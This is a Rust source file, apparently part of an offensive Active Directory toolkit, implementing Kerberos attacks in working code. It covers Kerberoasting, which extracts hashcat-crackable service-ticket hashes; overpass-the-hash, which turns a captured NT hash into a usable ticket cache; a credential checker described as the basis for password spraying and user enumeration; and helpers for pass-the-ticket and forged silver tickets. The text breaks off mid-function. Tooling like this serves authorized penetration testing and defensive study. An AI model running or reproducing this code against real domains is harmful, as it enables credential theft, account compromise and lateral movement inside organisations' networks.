//! Kerberoast: authenticated TGS-REQ path.
//!
//! Flow (all etype negotiation done with AES256 for the *client* key, since modern DCs
//! store AES keys for users):
//!   1. `get_tgt` — AS-REQ **with** PA-ENC-TIMESTAMP (proves knowledge of the password),
//!      decrypt the AS-REP enc-part to recover the TGT session key + the TGT itself.
//!   2. `roast_spn` — build an AP-REQ (authenticator encrypted under the session key),
//!      wrap it in a TGS-REQ for the target SPN, and extract the returned *service
//!      ticket* enc-part — the crackable Kerberoast material.
//!
//! The TGS-REQ requests an RC4 service ticket (etype 23) so the result is the canonical
//! hashcat-13100 hash. AES-only service accounts return etype 18 and are reported as such.

use crate::{format_tgs, kdc_exchange, krb_string, now_kerberos_time, principal, ETYPE_RC4_HMAC};
use anyhow::{anyhow, bail, Context, Result};

use picky_asn1::bit_string::BitString;
use picky_asn1::wrapper::{
    Asn1SequenceOf, BitStringAsn1, ExplicitContextTag0, ExplicitContextTag1, ExplicitContextTag10,
    ExplicitContextTag11, ExplicitContextTag2, ExplicitContextTag3, ExplicitContextTag4,
    ExplicitContextTag5, ExplicitContextTag6, ExplicitContextTag7, ExplicitContextTag8,
    GeneralStringAsn1, IntegerAsn1, OctetStringAsn1, Optional,
};
use picky_asn1_der::application_tag::ApplicationTag;
use picky_krb::constants::key_usages::{AS_REP_ENC, TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR};
use picky_krb::constants::types::{
    AP_REQ_MSG_TYPE, AS_REQ_MSG_TYPE, NT_PRINCIPAL, NT_SRV_INST, PA_ENC_TIMESTAMP_KEY_USAGE,
    TGS_REQ_MSG_TYPE,
};
use picky_krb::crypto::ChecksumSuite;
use picky_krb::crypto::{Cipher, CipherSuite};
use picky_krb::data_types::{
    Authenticator, AuthenticatorInner, AuthorizationData, AuthorizationDataInner, EncTicketPart,
    EncryptedData, EncryptionKey, EtypeInfo2, KerberosTime, PaData, PaEncTsEnc, PrincipalName,
    Ticket, TicketInner, TransitedEncoding,
};
use picky_krb::data_types::{Checksum, PaPacOptions};
use picky_krb::messages::{
    ApReq, ApReqInner, AsRep, AsReq, EncAsRepPart, KdcReq, KdcReqBody, KrbError, TgsRep, TgsReq,
};
use serde::Serialize;

/// Ticket-Granting Ticket plus the material needed to use it.
///
/// `Debug` is implemented manually to redact the session key + ticket ciphertext (which
/// contains the encrypted authenticator payload). If a downstream ever embeds a `Tgt` in a
/// `#[derive(Debug)]` struct, the redaction survives. Deriving `Debug` here would leak the
/// AES256 session key on any trace-line — including the ones WS-INT-VVV (1.4.7) now turns
/// on by default in interactive mode.
pub struct Tgt {
    ticket: Ticket,
    session_key: Vec<u8>,
    cname: PrincipalName,
    crealm: String,
}

impl std::fmt::Debug for Tgt {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("Tgt")
            .field("crealm", &self.crealm)
            .field("cname", &self.cname)
            .field("session_key", &"***")
            .field("ticket", &"***")
            .finish()
    }
}

fn aes256() -> Box<dyn Cipher> {
    CipherSuite::Aes256CtsHmacSha196.cipher()
}

/// A session key is RC4 (etype 23) when it's 16 bytes, else AES256 (etype 18) — so ticket
/// consumers can encrypt/decrypt the AP-REQ authenticator / TGS-REP with the matching cipher.
fn session_etype(key: &[u8]) -> u8 {
    if key.len() == 16 {
        ETYPE_RC4_HMAC
    } else {
        crate::ETYPE_AES256
    }
}
fn enc_session(key: &[u8], usage: i32, data: &[u8]) -> Result<Vec<u8>> {
    if key.len() == 16 {
        Ok(crate::rc4::encrypt(key, usage, data, None))
    } else {
        aes256()
            .encrypt(key, usage, data)
            .map_err(|e| anyhow!("encrypt (AES): {e}"))
    }
}
fn dec_session(key: &[u8], usage: i32, ct: &[u8]) -> Result<Vec<u8>> {
    if key.len() == 16 {
        crate::rc4::decrypt(key, usage, ct).map_err(|e| anyhow!("decrypt (RC4): {e}"))
    } else {
        aes256()
            .decrypt(key, usage, ct)
            .map_err(|e| anyhow!("decrypt (AES): {e}"))
    }
}

impl Tgt {
    /// The TGT's encrypted enc-part ciphertext (EncTicketPart, sealed under the krbtgt key).
    pub fn ticket_cipher(&self) -> &[u8] {
        &self.ticket.0.enc_part.0.cipher.0 .0
    }
    /// The TGT session key (from the AS-REP enc-part).
    pub fn session_key_bytes(&self) -> &[u8] {
        &self.session_key
    }
    pub fn crealm(&self) -> &str {
        &self.crealm
    }
    pub fn cname(&self) -> &PrincipalName {
        &self.cname
    }
}

fn encrypted_data(etype: u8, cipher: Vec<u8>) -> EncryptedData {
    EncryptedData {
        etype: ExplicitContextTag0::from(IntegerAsn1(vec![etype])),
        kvno: Optional::from(None),
        cipher: ExplicitContextTag2::from(OctetStringAsn1(cipher)),
    }
}

fn kdc_options() -> BitStringAsn1 {
    // forwardable | renewable | canonicalize
    BitStringAsn1::from(BitString::with_bytes(vec![0x40, 0x81, 0x00, 0x00]))
}

fn nonce() -> IntegerAsn1 {
    let mut n = [0u8; 4];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut n);
    n[0] &= 0x7f;
    IntegerAsn1(n.to_vec())
}

/// Build an AS-REQ for `user@realm` requesting AES256, optionally carrying pre-auth.
fn build_as_req(realm: &str, user: &str, padata: Option<PaData>) -> Result<AsReq> {
    build_as_req_etype(realm, user, padata, crate::ETYPE_AES256)
}

/// As [`build_as_req`] but requesting a specific etype (e.g. RC4 for overpass-the-hash).
fn build_as_req_etype(realm: &str, user: &str, padata: Option<PaData>, etype: u8) -> Result<AsReq> {
    let body = KdcReqBody {
        kdc_options: ExplicitContextTag0::from(kdc_options()),
        cname: Optional::from(Some(ExplicitContextTag1::from(principal(
            NT_PRINCIPAL,
            &[user],
        )?))),
        realm: ExplicitContextTag2::from(krb_string(realm)?),
        sname: Optional::from(Some(ExplicitContextTag3::from(principal(
            NT_SRV_INST,
            &["krbtgt", realm],
        )?))),
        from: Optional::from(None),
        till: ExplicitContextTag5::from(crate::far_future_time()),
        rtime: Optional::from(None),
        nonce: ExplicitContextTag7::from(nonce()),
        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(vec![IntegerAsn1(vec![etype])])),
        addresses: Optional::from(None),
        enc_authorization_data: Optional::from(None),
        additional_tickets: Optional::from(None),
    };
    let pa = padata.map(|p| ExplicitContextTag3::from(Asn1SequenceOf::from(vec![p])));
    Ok(AsReq::from(KdcReq {
        pvno: ExplicitContextTag1::from(IntegerAsn1(vec![5])),
        msg_type: ExplicitContextTag2::from(IntegerAsn1(vec![AS_REQ_MSG_TYPE])),
        padata: Optional::from(pa),
        req_body: ExplicitContextTag4::from(body),
    }))
}

/// Pull the AES salt from a KRB-ERROR's ETYPE-INFO2 pre-auth hint; fall back to `default`.
fn extract_salt(err: &KrbError, default: &str) -> String {
    let Some(edata) = err.0.e_data.0.as_ref() else {
        return default.to_string();
    };
    let Ok(padatas) =
        picky_asn1_der::from_bytes::<picky_asn1::wrapper::Asn1SequenceOf<PaData>>(&edata.0 .0)
    else {
        return default.to_string();
    };
    for pa in padatas.0 {
        if pa.padata_type.0 .0 == vec![0x13] {
            // PA-ETYPE-INFO2
            if let Ok(info) = picky_asn1_der::from_bytes::<EtypeInfo2>(&pa.padata_data.0 .0) {
                for entry in info.0 {
                    if let Some(salt) = entry.salt.0.as_ref() {
                        return String::from_utf8_lossy(salt.0.as_bytes()).into_owned();
                    }
                }
            }
        }
    }
    default.to_string()
}

/// AS-REP roast a TGT via the two-step AS exchange: first an un-authenticated AS-REQ to
/// learn the real salt (ETYPE-INFO2), then an AS-REQ with PA-ENC-TIMESTAMP.
pub async fn get_tgt(user: &str, password: &str, realm: &str, kdc: &str) -> Result<Tgt> {
    let realm = realm.to_uppercase();
    let cipher = aes256();
    // The Kerberos client principal is the bare sAMAccountName — strip any UPN suffix
    // (user@realm) or NetBIOS prefix (DOMAIN\user) that came from the LDAP bind identity.
    let user = user.split('@').next().unwrap_or(user);
    let user = user.rsplit('\\').next().unwrap_or(user);
    let default_salt = format!("{realm}{user}");
    tracing::debug!(
        user, realm = %realm, kdc, cipher = "aes256-cts-hmac-sha1-96",
        "get_tgt: AS-REQ round-trip start"
    );

    // Step 1 — no pre-auth: expect KRB-ERROR(25 = PREAUTH_REQUIRED) carrying ETYPE-INFO2.
    let raw1 = picky_asn1_der::to_vec(&build_as_req(&realm, user, None)?)
        .map_err(|e| anyhow!("encode AS-REQ#1: {e}"))?;
    tracing::trace!(bytes = raw1.len(), "AS-REQ#1 sent (no pre-auth)");
    let resp1 = kdc_exchange(kdc, &raw1).await?;
    tracing::trace!(bytes = resp1.len(), "AS-REQ#1 response");
    let salt = if picky_asn1_der::from_bytes::<AsRep>(&resp1).is_ok() {
        default_salt.clone() // pre-auth not required (rare)
    } else {
        match picky_asn1_der::from_bytes::<KrbError>(&resp1) {
            Ok(err) => {
                let code = err.0.error_code.0;
                if code != 25 {
                    bail!("KDC error {code} on initial AS-REQ");
                }
                extract_salt(&err, &default_salt)
            }
            Err(e) => bail!("unexpected AS response: {e}"),
        }
    };

    let key = cipher
        .generate_key_from_password(password.as_bytes(), salt.as_bytes())
        .map_err(|e| anyhow!("derive AES key: {e}"))?;

    // Step 2 — AS-REQ with PA-ENC-TIMESTAMP encrypted under the derived key.
    let ts = PaEncTsEnc {
        patimestamp: ExplicitContextTag0::from(now_kerberos_time()),
        pausec: Optional::from(None),
    };
    let ts_der = picky_asn1_der::to_vec(&ts).map_err(|e| anyhow!("encode PA-TS: {e}"))?;
    let enc_ts = cipher
        .encrypt(&key, PA_ENC_TIMESTAMP_KEY_USAGE, &ts_der)
        .map_err(|e| anyhow!("encrypt PA-TS: {e}"))?;
    let padata = PaData {
        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x02])),
        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
            picky_asn1_der::to_vec(&encrypted_data(crate::ETYPE_AES256, enc_ts))
                .map_err(|e| anyhow!("encode PA-TS ED: {e}"))?,
        )),
    };
    let raw2 = picky_asn1_der::to_vec(&build_as_req(&realm, user, Some(padata))?)
        .map_err(|e| anyhow!("encode AS-REQ#2: {e}"))?;
    tracing::trace!(bytes = raw2.len(), "AS-REQ#2 sent (with PA-ENC-TIMESTAMP)");
    let resp2 = kdc_exchange(kdc, &raw2).await?;
    tracing::trace!(bytes = resp2.len(), "AS-REQ#2 response");
    let as_rep: AsRep = picky_asn1_der::from_bytes(&resp2).map_err(|e| {
        match picky_asn1_der::from_bytes::<KrbError>(&resp2) {
            Ok(err) => {
                let code = err.0.error_code.0;
                tracing::warn!(code, "KDC rejected pre-auth AS-REQ");
                anyhow!("pre-auth AS-REQ rejected, KDC error {code}")
            }
            Err(_) => anyhow!("AS-REP decode: {e}"),
        }
    })?;

    let enc = &as_rep.0.enc_part.0;
    let plain = cipher
        .decrypt(&key, AS_REP_ENC, &enc.cipher.0 .0)
        .map_err(|e| anyhow!("decrypt AS-REP: {e}"))?;
    let enc_part: EncAsRepPart =
        picky_asn1_der::from_bytes(&plain).map_err(|e| anyhow!("EncAsRepPart decode: {e}"))?;
    let session_key = enc_part.0.key.0.key_value.0 .0.clone();
    tracing::debug!(
        session_key_len = session_key.len(),
        etype = enc.etype.0 .0.first().copied().unwrap_or(0),
        "TGT acquired"
    );

    Ok(Tgt {
        ticket: as_rep.0.ticket.0.clone(),
        session_key,
        cname: as_rep.0.cname.0.clone(),
        crealm: realm,
    })
}

/// Ask-TGT: obtain a TGT with a password (AES256 first, with ETYPE-INFO2 salt discovery) and emit
/// a reusable MIT ccache for Kerberos-only (`-k`) workflows. If the account has no AES key (the KDC
/// answers ETYPE_NOSUPP) — e.g. the built-in Administrator whose password was set before the domain
/// existed, or an RC4-only account — it transparently falls back to an RC4-HMAC TGT from the NT hash.
pub async fn asktgt(user: &str, realm: &str, kdc: &str, password: &str) -> Result<Vec<u8>> {
    let realm = realm.to_uppercase();
    let user = user.split('@').next().unwrap_or(user);
    let user = user.rsplit('\\').next().unwrap_or(user);
    tracing::debug!(
        user, realm = %realm, kdc, cipher = "aes256-cts-hmac-sha1-96",
        "asktgt: AS-REQ round-trip start (ccache output path)"
    );

    let cipher = aes256();
    let etype = crate::ETYPE_AES256;
    let default_salt = format!("{realm}{user}");
    let raw1 = picky_asn1_der::to_vec(&build_as_req(&realm, user, None)?)
        .map_err(|e| anyhow!("encode AS-REQ#1: {e}"))?;
    tracing::trace!(
        bytes = raw1.len(),
        "AS-REQ#1 sent (no pre-auth, salt discovery)"
    );
    let resp1 = kdc_exchange(kdc, &raw1).await?;
    tracing::trace!(bytes = resp1.len(), "AS-REQ#1 response");
    let salt = if picky_asn1_der::from_bytes::<AsRep>(&resp1).is_ok() {
        default_salt.clone()
    } else {
        match picky_asn1_der::from_bytes::<KrbError>(&resp1) {
            Ok(err) => extract_salt(&err, &default_salt),
            Err(e) => bail!("unexpected AS response: {e}"),
        }
    };
    let key = cipher
        .generate_key_from_password(password.as_bytes(), salt.as_bytes())
        .map_err(|e| anyhow!("derive AES key: {e}"))?;

    // AS-REQ with PA-ENC-TIMESTAMP under the derived key.
    let ts = PaEncTsEnc {
        patimestamp: ExplicitContextTag0::from(now_kerberos_time()),
        pausec: Optional::from(None),
    };
    let ts_der = picky_asn1_der::to_vec(&ts).map_err(|e| anyhow!("encode PA-TS: {e}"))?;
    let enc_ts = cipher
        .encrypt(&key, PA_ENC_TIMESTAMP_KEY_USAGE, &ts_der)
        .map_err(|e| anyhow!("encrypt PA-TS: {e}"))?;
    let padata = PaData {
        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x02])),
        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
            picky_asn1_der::to_vec(&encrypted_data(etype, enc_ts))
                .map_err(|e| anyhow!("encode PA-TS ED: {e}"))?,
        )),
    };
    let raw2 = picky_asn1_der::to_vec(&build_as_req_etype(&realm, user, Some(padata), etype)?)
        .map_err(|e| anyhow!("encode AS-REQ#2: {e}"))?;
    let resp2 = kdc_exchange(kdc, &raw2).await?;
    if let Ok(err) = picky_asn1_der::from_bytes::<KrbError>(&resp2) {
        // KDC_ERR_ETYPE_NOSUPP (14): the account has no AES key — e.g. its password was set
        // outside a domain context (the built-in Administrator on a freshly promoted DC) or it is
        // RC4-only. Fall back to an RC4-HMAC TGT derived from the NT hash of the password.
        if err.0.error_code.0 == 14 {
            let nt = crate::rc4::nt_hash(password);
            return overpass_the_hash(user, &realm, kdc, &nt).await;
        }
        bail!("AS-REQ rejected, KDC error {}", err.0.error_code.0);
    }
    let as_rep: AsRep =
        picky_asn1_der::from_bytes(&resp2).map_err(|e| anyhow!("AS-REP decode: {e}"))?;
    let enc = &as_rep.0.enc_part.0;
    let plain = cipher
        .decrypt(&key, AS_REP_ENC, &enc.cipher.0 .0)
        .map_err(|e| anyhow!("decrypt AS-REP: {e}"))?;
    let enc_part: EncAsRepPart =
        picky_asn1_der::from_bytes(&plain).map_err(|e| anyhow!("EncAsRepPart decode: {e}"))?;
    crate::pkinit::build_ccache(&as_rep, &enc_part, &realm, user)
}

/// Overpass-the-hash: obtain a TGT from just an NT hash via RC4-HMAC (etype 23) — the legacy
/// (RC4-enabled, Server ≤2022) path. No salt discovery needed: the RC4 Kerberos key *is* the NT
/// hash, so a captured/pass-the-hash NT hash becomes a full Kerberos TGT (ccache).
pub async fn overpass_the_hash(
    user: &str,
    realm: &str,
    kdc: &str,
    nt: &[u8; 16],
) -> Result<Vec<u8>> {
    let realm = realm.to_uppercase();
    let user = user.split('@').next().unwrap_or(user);
    let user = user.rsplit('\\').next().unwrap_or(user);
    let etype = ETYPE_RC4_HMAC;

    // PA-ENC-TIMESTAMP encrypted under the NT hash (RC4-HMAC, key usage 1).
    let ts = PaEncTsEnc {
        patimestamp: ExplicitContextTag0::from(now_kerberos_time()),
        pausec: Optional::from(None),
    };
    let ts_der = picky_asn1_der::to_vec(&ts).map_err(|e| anyhow!("encode PA-TS: {e}"))?;
    let enc_ts = crate::rc4::encrypt(nt, PA_ENC_TIMESTAMP_KEY_USAGE, &ts_der, None);
    let padata = PaData {
        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x02])), // PA-ENC-TIMESTAMP
        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
            picky_asn1_der::to_vec(&encrypted_data(etype, enc_ts))
                .map_err(|e| anyhow!("encode PA-TS ED: {e}"))?,
        )),
    };
    let raw = picky_asn1_der::to_vec(&build_as_req_etype(&realm, user, Some(padata), etype)?)
        .map_err(|e| anyhow!("encode AS-REQ: {e}"))?;
    let resp = kdc_exchange(kdc, &raw).await?;
    let as_rep: AsRep = picky_asn1_der::from_bytes(&resp).map_err(|e| {
        match picky_asn1_der::from_bytes::<KrbError>(&resp) {
            Ok(err) => anyhow!(
                "AS-REQ rejected, KDC error {} (RC4 disabled on this DC? — RC4 is off by default on Server 2025)",
                err.0.error_code.0
            ),
            Err(_) => anyhow!("AS-REP decode: {e}"),
        }
    })?;
    let enc = &as_rep.0.enc_part.0;
    let plain = crate::rc4::decrypt(nt, AS_REP_ENC, &enc.cipher.0 .0)
        .map_err(|e| anyhow!("decrypt AS-REP (RC4): {e}"))?;
    let enc_part: EncAsRepPart =
        picky_asn1_der::from_bytes(&plain).map_err(|e| anyhow!("EncAsRepPart decode: {e}"))?;
    crate::pkinit::build_ccache(&as_rep, &enc_part, &realm, user)
}

/// Outcome of a Kerberos pre-auth credential check (password spray / user enum).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum CredResult {
    Valid,           // AS-REP returned — password correct
    ValidButExpired, // correct password, must change (KEY_EXPIRED)
    Invalid,         // PREAUTH_FAILED — wrong password
    Disabled,        // CLIENT_REVOKED — locked/disabled/expired account
    NoPreAuth,       // DONT_REQ_PREAUTH — AS-REP roastable, password not verifiable this way
    NoSuchUser,      // C_PRINCIPAL_UNKNOWN — account does not exist
    Other(u32),
}

/// Validate one credential via a Kerberos AS pre-auth exchange (no LDAP needed). The KDC
/// error code classifies the result — the basis for password spraying and user enumeration.
pub async fn check_credential(
    user: &str,
    password: &str,
    realm: &str,
    kdc: &str,
) -> Result<CredResult> {
    let realm = realm.to_uppercase();
    let cipher = aes256();
    let user = user.split('@').next().unwrap_or(user);
    let user = user.rsplit('\\').next().unwrap_or(user);
    let default_salt = format!("{realm}{user}");

    // Step 1 — no pre-auth: classify by response.
    let raw1 = picky_asn1_der::to_vec(&build_as_req(&realm, user, None)?)
        .map_err(|e| anyhow!("encode AS-REQ#1: {e}"))?;
    let resp1 = kdc_exchange(kdc, &raw1).await?;
    if picky_asn1_der::from_bytes::<AsRep>(&resp1).is_ok() {
        return Ok(CredResult::NoPreAuth); // pre-auth not required for this account
    }
    let salt = match picky_asn1_der::from_bytes::<KrbError>(&resp1) {
        Ok(err) => match err.0.error_code.0 {
            25 => extract_salt(&err, &default_salt), // PREAUTH_REQUIRED — normal
            6 => return Ok(CredResult::NoSuchUser),
            c => return Ok(CredResult::Other(c)),
        },
        Err(e) => bail!("unexpected AS response: {e}"),
    };

    // Step 2 — pre-auth with the candidate password.
    let key = cipher
        .generate_key_from_password(password.as_bytes(), salt.as_bytes())
        .map_err(|e| anyhow!("derive key: {e}"))?;
    let ts = PaEncTsEnc {
        patimestamp: ExplicitContextTag0::from(now_kerberos_time()),
        pausec: Optional::from(None),
    };
    let enc_ts = cipher
        .encrypt(
            &key,
            PA_ENC_TIMESTAMP_KEY_USAGE,
            &picky_asn1_der::to_vec(&ts).unwrap(),
        )
        .map_err(|e| anyhow!("encrypt PA-TS: {e}"))?;
    let padata = PaData {
        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x02])),
        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
            picky_asn1_der::to_vec(&encrypted_data(crate::ETYPE_AES256, enc_ts)).unwrap(),
        )),
    };
    let raw2 = picky_asn1_der::to_vec(&build_as_req(&realm, user, Some(padata))?)
        .map_err(|e| anyhow!("encode AS-REQ#2: {e}"))?;
    let resp2 = kdc_exchange(kdc, &raw2).await?;

    if picky_asn1_der::from_bytes::<AsRep>(&resp2).is_ok() {
        return Ok(CredResult::Valid);
    }
    Ok(match picky_asn1_der::from_bytes::<KrbError>(&resp2) {
        Ok(err) => match err.0.error_code.0 {
            24 => CredResult::Invalid,         // PREAUTH_FAILED
            18 => CredResult::Disabled,        // CLIENT_REVOKED
            23 => CredResult::ValidButExpired, // KEY_EXPIRED
            6 => CredResult::NoSuchUser,
            c => CredResult::Other(c),
        },
        Err(_) => CredResult::Other(0),
    })
}

/// Build a TGS-REQ for `spn` using the TGT, and return the crackable service-ticket hash.
pub async fn roast_spn(tgt: &Tgt, sam: &str, spn: &str, kdc: &str) -> Result<String> {
    // Authenticator, encrypted under the TGT session key (usage 7).
    let authenticator = Authenticator::from(AuthenticatorInner {
        authenticator_bno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
        crealm: ExplicitContextTag1::from(krb_string(&tgt.crealm)?),
        cname: ExplicitContextTag2::from(tgt.cname.clone()),
        cksum: Optional::from(None),
        cusec: ExplicitContextTag4::from(IntegerAsn1(vec![0])),
        ctime: ExplicitContextTag5::from(now_kerberos_time()),
        subkey: Optional::from(None),
        seq_number: Optional::from(None),
        authorization_data: Optional::from(None),
    });
    let auth_der =
        picky_asn1_der::to_vec(&authenticator).map_err(|e| anyhow!("encode authenticator: {e}"))?;
    let enc_auth = enc_session(
        &tgt.session_key,
        TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR,
        &auth_der,
    )?;

    // AP-REQ carrying the TGT + encrypted authenticator.
    let ap_req = ApReq::from(ApReqInner {
        pvno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
        msg_type: ExplicitContextTag1::from(IntegerAsn1(vec![AP_REQ_MSG_TYPE])),
        ap_options: ExplicitContextTag2::from(BitStringAsn1::from(BitString::with_bytes(vec![
            0, 0, 0, 0,
        ]))),
        ticket: ExplicitContextTag3::from(tgt.ticket.clone()),
        authenticator: ExplicitContextTag4::from(encrypted_data(
            session_etype(&tgt.session_key),
            enc_auth,
        )),
    });
    let ap_der = picky_asn1_der::to_vec(&ap_req).map_err(|e| anyhow!("encode AP-REQ: {e}"))?;
    let pa_tgs = PaData {
        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x01])), // PA-TGS-REQ
        padata_data: ExplicitContextTag2::from(OctetStringAsn1(ap_der)),
    };

    // SPN → sname (split service class / instance on '/').
    let parts: Vec<&str> = spn.split('/').collect();
    let sname = principal(NT_SRV_INST, &parts)?;

    let body = KdcReqBody {
        kdc_options: ExplicitContextTag0::from(kdc_options()),
        cname: Optional::from(None), // identity comes from the ticket
        realm: ExplicitContextTag2::from(krb_string(&tgt.crealm)?),
        sname: Optional::from(Some(ExplicitContextTag3::from(sname))),
        from: Optional::from(None),
        till: ExplicitContextTag5::from(crate::far_future_time()),
        rtime: Optional::from(None),
        nonce: ExplicitContextTag7::from(nonce()),
        // Offer RC4 (hashcat 13100) first, then AES256 (19700) — so AES-only service accounts
        // (hardened / Server 2025 defaults) still return a ticket instead of KDC_ERR_ETYPE_NOSUPP.
        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(vec![
            IntegerAsn1(vec![ETYPE_RC4_HMAC]),
            IntegerAsn1(vec![crate::ETYPE_AES256]),
        ])),
        addresses: Optional::from(None),
        enc_authorization_data: Optional::from(None),
        additional_tickets: Optional::from(None),
    };
    let tgs_req = TgsReq::from(KdcReq {
        pvno: ExplicitContextTag1::from(IntegerAsn1(vec![5])),
        msg_type: ExplicitContextTag2::from(IntegerAsn1(vec![TGS_REQ_MSG_TYPE])),
        padata: Optional::from(Some(ExplicitContextTag3::from(Asn1SequenceOf::from(vec![
            pa_tgs,
        ])))),
        req_body: ExplicitContextTag4::from(body),
    });

    let raw = picky_asn1_der::to_vec(&tgs_req).map_err(|e| anyhow!("encode TGS-REQ: {e}"))?;
    let resp = kdc_exchange(kdc, &raw).await?;
    let tgs_rep: TgsRep =
        picky_asn1_der::from_bytes(&resp).map_err(|_| anyhow!("TGS-REP: {}", krb_err(&resp)))?;

    // The crackable material is the *service ticket* enc-part.
    let tkt_enc = &tgs_rep.0.ticket.0 .0.enc_part.0;
    let etype = tkt_enc
        .etype
        .0
         .0
        .iter()
        .fold(0u32, |a, &b| (a << 8) | b as u32);
    let cipher = &tkt_enc.cipher.0 .0;
    // RC4 (23) → hashcat 13100; AES128/256 (17/18) → hashcat 19600/19700.
    Ok(if etype == ETYPE_RC4_HMAC as u32 {
        format_tgs(sam, &tgt.crealm, spn, cipher)
    } else {
        crate::format_tgs_aes(sam, &tgt.crealm, spn, etype as u8, cipher)
    })
}

/// A service ticket plus its session key — the material for a Kerberos AP-REQ (pass-the-ticket).
///
/// `Debug` is implemented manually to redact `session_key` + `ticket` bytes for the same
/// reason as [`Tgt`]. Field access via `.session_key` is intentionally left `pub` so crypto
/// call sites (`pac`, silver ticket forge, downstream tools) can consume the raw key
/// material — but nothing formats it, and no `{:?}` will ever surface it in a trace line.
pub struct ServiceTicket {
    pub ticket: Ticket,
    pub session_key: Vec<u8>,
    pub crealm: String,
    pub cname: PrincipalName,
    pub spn: Vec<String>,
}

impl std::fmt::Debug for ServiceTicket {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("ServiceTicket")
            .field("crealm", &self.crealm)
            .field("cname", &self.cname)
            .field("spn", &self.spn)
            .field("session_key", &"***")
            .field("ticket", &"***")
            .finish()
    }
}

/// TGS-REQ for `spn` using a TGT (real or forged golden), requesting an AES256 service ticket, and
/// decrypt the reply enc-part with the TGT session key (usage 8) to recover the new service
/// session key. The returned [`ServiceTicket`] drives a Kerberos SMB/LDAP AP-REQ.
pub async fn get_service_ticket(tgt: &Tgt, spn: &str, kdc: &str) -> Result<ServiceTicket> {
    use picky_krb::constants::key_usages::TGS_REP_ENC_SESSION_KEY;
    use picky_krb::messages::{EncAsRepPart, EncTgsRepPart};

    tracing::debug!(
        spn, kdc, crealm = %tgt.crealm, etypes = "AES256+RC4",
        "get_service_ticket: TGS-REQ start"
    );

    let comps: Vec<&str> = spn.split('/').collect();
    let req = build_tgs_req(
        &tgt.crealm,
        principal(NT_SRV_INST, &comps)?,
        vec![ap_req_padata(tgt)?],
        [0x40, 0x81, 0x00, 0x00], // forwardable | renewable | canonicalize
        vec![],
        // Offer RC4 as well as AES256: a TGT from overpass-the-hash (NT hash → pass-the-ticket)
        // has an RC4 session key, and an AES256-only request can draw KDC_ERR_ETYPE_NOSUPP. The
        // reply session key is decrypted by dec_session(), which handles both; SMB signing uses a
        // fresh AES128 subkey regardless, so the service-session etype does not matter downstream.
        &[crate::ETYPE_AES256, ETYPE_RC4_HMAC],
    )?;
    let raw = picky_asn1_der::to_vec(&req).map_err(|e| anyhow!("TGS-REQ encode: {e}"))?;
    tracing::trace!(bytes = raw.len(), spn, "TGS-REQ sent");
    let resp = kdc_exchange(kdc, &raw).await?;
    tracing::trace!(bytes = resp.len(), "TGS-REP response");
    let tgs_rep: TgsRep = picky_asn1_der::from_bytes(&resp).map_err(|_| {
        let err_str = krb_err(&resp);
        tracing::warn!(spn, "TGS-REP: {err_str}");
        anyhow!("TGS-REP: {err_str}")
    })?;

    // Reply enc-part is sealed under the TGT session key (usage 8). Windows tags it as either
    // EncTGSRepPart (26) or EncASRepPart (25) — accept both.
    let enc = &tgs_rep.0.enc_part.0.cipher.0 .0;
    let plain = dec_session(&tgt.session_key, TGS_REP_ENC_SESSION_KEY, enc)?;
    let kdc_rep = picky_asn1_der::from_bytes::<EncTgsRepPart>(&plain)
        .map(|p| p.0)
        .or_else(|_| picky_asn1_der::from_bytes::<EncAsRepPart>(&plain).map(|p| p.0))
        .map_err(|e| anyhow!("decode EncKDCRepPart: {e}"))?;
    let session_key = kdc_rep.key.0.key_value.0 .0.clone();
    tracing::debug!(
        spn,
        session_key_len = session_key.len(),
        rep_etype = tgs_rep
            .0
            .enc_part
            .0
            .etype
            .0
             .0
            .first()
            .copied()
            .unwrap_or(0),
        "Service ticket acquired"
    );

    Ok(ServiceTicket {
        ticket: tgs_rep.0.ticket.0.clone(),
        session_key,
        crealm: tgt.crealm.clone(),
        cname: tgt.cname.clone(),
        spn: comps.iter().map(|s| s.to_string()).collect(),
    })
}

/// Wrap a forged silver ticket ([`forge_silver_tgt`]) as a [`ServiceTicket`] for AP-REQ — no KDC
/// round-trip; the session key is the one embedded when forging.
pub fn silver_service_ticket(tgt: &Tgt, spn: &str) -> ServiceTicket {
    ServiceTicket {
        ticket: tgt.ticket.clone(),
        session_key: tgt.session_key.clone(),
        crealm: tgt.crealm.clone(),
        cname: tgt.cname.clone(),
        spn: spn.split('/').map(|s| s.to_string()).collect(),
    }
}

/// Build the GSS/SPNEGO AP-REQ blob for an SMB2 SESSION_SETUP from a [`ServiceTicket`], and return
/// it together with the 16-byte SMB session key. The authenticator carries a random AES128 subkey
/// (etype 17) which becomes the GSS/SMB session key, so SMB signing is deterministic on our side.
pub fn build_ap_req_gss(st: &ServiceTicket) -> Result<(Vec<u8>, [u8; 16])> {
    // Random 16-byte subkey → the SMB session key.
    let mut subkey = [0u8; 16];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut subkey);

    // GSS 0x8003 checksum: Lgth(=16) + Bnd(16 zero) + Flags. Flags = INTEG|CONF|SEQUENCE|REPLAY
    // (0x3c) — deliberately NOT MUTUAL (0x02), so the server completes in one leg with our subkey
    // as the session key (no AP-REP acceptor subkey).
    let mut gss_cksum = Vec::new();
    gss_cksum.extend_from_slice(&16u32.to_le_bytes());
    gss_cksum.extend_from_slice(&[0u8; 16]);
    gss_cksum.extend_from_slice(&0x0000_003cu32.to_le_bytes());

    let authenticator = Authenticator::from(AuthenticatorInner {
